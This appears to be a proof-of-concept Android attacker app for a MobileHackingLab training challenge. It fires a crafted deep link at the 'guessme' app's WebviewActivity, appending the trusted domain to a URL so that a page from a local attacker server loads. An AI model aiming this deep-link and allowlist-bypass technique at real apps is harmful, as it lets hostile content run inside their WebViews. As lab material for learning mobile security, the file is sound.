       
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
       
        Uri uri = Uri.parse("mhl://mobilehackinglab/?url=http://10.0.2.2:5500/poc.html?mobilehackinglab.com");
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setClassName("com.mobilehackinglab.guessme", "com.mobilehackinglab.guessme.WebviewActivity");
        intent.setData(uri);
        startActivity(intent);


    }
}